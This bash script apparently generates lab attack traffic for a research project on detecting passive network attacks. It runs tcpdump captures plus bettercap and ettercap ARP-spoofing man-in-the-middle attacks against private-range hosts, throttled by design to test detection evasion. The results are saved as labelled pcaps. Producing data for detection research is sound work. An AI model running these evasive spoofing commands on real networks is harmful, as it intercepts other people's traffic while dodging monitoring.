#!/usr/bin/env bash
# ============================================================================
# evasion_and_passive_tool_tests.sh   (run on attacker-kali)
#
# Runs three back-to-back segments, unattended:
#   1. tcpdump_passive  -- a second, mechanically-different passive tool
#                          (tests generalization across passive tools, not
#                          just "any tool")
#   2. bettercap_slow   -- bettercap with THROTTLED arp.spoof.interval and
#                          net.probe.throttle (evasion resilience test)
#   3. ettercap_slow    -- ettercap with an increased arp_poison_delay in
#                          etter.conf, backed up and restored automatically
#                          (evasion resilience test)
#
# Copies each finished pcap into the shared project folder and prints
# ready-to-paste attack_log.csv lines at the end.
#
# SAFETY: bettercap has been observed prompting an interactive "Are you
# sure? y/n" on Ctrl+C in earlier sessions. To guarantee this script can
# never hang waiting for that answer, every `timeout` call below uses
# `-k 10` (hard-kill 10s after the soft timeout if the process hasn't
# exited) and stdin is redirected from /dev/null.
#
# Usage: bash evasion_and_passive_tool_tests.sh
# ============================================================================
set -u   # (not -e: we want to keep going and still restore etter.conf even
          #  if one segment has a hiccup)

SHARE_DIR="/media/sf_shared_Kali/passive-attack-detection/data/attack"
LOGFILE="/tmp/evasion_test_timestamps.txt"
> "$LOGFILE"

ensure_share_dir() {
    mkdir -p "$SHARE_DIR" 2>/dev/null || sudo mkdir -p "$SHARE_DIR"
}

log_segment() {
    local name="$1" start="$2" end="$3"
    echo "${name},${start},${end}" | tee -a "$LOGFILE"
}

ensure_share_dir

echo "############################################################"
echo "# Segment 1: tcpdump as a second passive tool (90s)"
echo "############################################################"
START=$(date '+%Y-%m-%d %H:%M:%S')
sudo timeout -k 10 90 tcpdump -i eth0 -w /tmp/tcpdump_passive_test.pcap < /dev/null
END=$(date '+%Y-%m-%d %H:%M:%S')
log_segment "tcpdump_passive" "$START" "$END"
sudo cp /tmp/tcpdump_passive_test.pcap "$SHARE_DIR/tcpdump_passive_test.pcap"
sudo chmod 644 "$SHARE_DIR/tcpdump_passive_test.pcap"
echo "Segment 1 done."
echo

echo "Idle gap (30s) before next segment ..."
sleep 30
echo

echo "############################################################"
echo "# Segment 2: bettercap, THROTTLED (evasion test)"
echo "############################################################"
START=$(date '+%Y-%m-%d %H:%M:%S')
sudo timeout -k 10 90 tcpdump -i eth0 -w /tmp/bettercap_slow_test.pcap < /dev/null &
TCPDUMP_PID=$!
sleep 2   # let tcpdump attach before bettercap starts
sudo timeout -k 10 80 bettercap -iface eth0 \
    -eval "set arp.spoof.interval 5000; set net.probe.throttle 300; arp.spoof on; net.probe on" \
    < /dev/null
wait "$TCPDUMP_PID" 2>/dev/null
END=$(date '+%Y-%m-%d %H:%M:%S')
log_segment "bettercap_slow" "$START" "$END"
sudo cp /tmp/bettercap_slow_test.pcap "$SHARE_DIR/bettercap_slow_test.pcap"
sudo chmod 644 "$SHARE_DIR/bettercap_slow_test.pcap"
echo "Segment 2 done."
echo

echo "Idle gap (30s) before next segment ..."
sleep 30
echo

echo "############################################################"
echo "# Segment 3: ettercap, THROTTLED via etter.conf (evasion test)"
echo "############################################################"
ETTER_CONF="/etc/ettercap/etter.conf"
if [ ! -f "$ETTER_CONF" ]; then
    echo "etter.conf not at the default path -- searching for it ..."
    FOUND=$(sudo find /etc /usr/share /usr/local -iname "etter.conf" 2>/dev/null | head -1)
    if [ -n "$FOUND" ]; then
        ETTER_CONF="$FOUND"
    else
        echo "ERROR: could not locate etter.conf anywhere. Skipping ettercap_slow segment."
        ETTER_CONF=""
    fi
fi

if [ -n "$ETTER_CONF" ]; then
    echo "Using etter.conf at: $ETTER_CONF"
    sudo cp "$ETTER_CONF" /tmp/etter.conf.bak
    echo "Backed up original to /tmp/etter.conf.bak"

    echo "Current arp_poison_delay line (before change):"
    grep -E "arp_poison_delay" "$ETTER_CONF" || echo "  (line not found -- will be added is NOT attempted; see note below)"

    # Uncomment-and-set if the line exists in any form (commented or not).
    sudo sed -i -E 's/^[[:space:]]*#?[[:space:]]*arp_poison_delay[[:space:]]*=.*/  arp_poison_delay = 30/' "$ETTER_CONF"

    echo "After change:"
    grep -E "arp_poison_delay" "$ETTER_CONF"

    restore_etter_conf() {
        echo "Restoring original etter.conf from backup ..."
        sudo cp /tmp/etter.conf.bak "$ETTER_CONF"
        echo "Restored. Verify:"
        grep -E "arp_poison_delay" "$ETTER_CONF"
    }
    trap restore_etter_conf EXIT

    START=$(date '+%Y-%m-%d %H:%M:%S')
    sudo timeout -k 10 90 tcpdump -i eth0 -w /tmp/ettercap_slow_test.pcap < /dev/null &
    TCPDUMP_PID=$!
    sleep 2
    sudo timeout -k 10 80 ettercap -T -M arp:remote /192.168.50.11// /192.168.50.12// < /dev/null
    wait "$TCPDUMP_PID" 2>/dev/null
    END=$(date '+%Y-%m-%d %H:%M:%S')
    log_segment "ettercap_slow" "$START" "$END"
    sudo cp /tmp/ettercap_slow_test.pcap "$SHARE_DIR/ettercap_slow_test.pcap"
    sudo chmod 644 "$SHARE_DIR/ettercap_slow_test.pcap"
    echo "Segment 3 done."
    # trap fires on script exit, restoring etter.conf automatically
else
    echo "Skipped ettercap_slow segment (see error above)."
fi

echo
echo "############################################################"
echo "# ALL SEGMENTS DONE."
echo "# Append these lines to attack_log.csv (do NOT remove existing rows):"
echo "############################################################"
cat "$LOGFILE"
